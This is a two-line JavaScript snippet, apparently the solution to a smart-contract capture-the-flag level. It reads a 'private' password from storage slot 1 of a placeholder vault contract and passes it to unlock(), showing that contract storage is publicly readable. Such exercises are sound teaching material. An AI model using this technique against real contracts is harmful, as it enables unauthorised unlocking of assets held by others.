const password = await web3.eth.getStorageAt("0xVault", 1);

await contract.unlock(password);
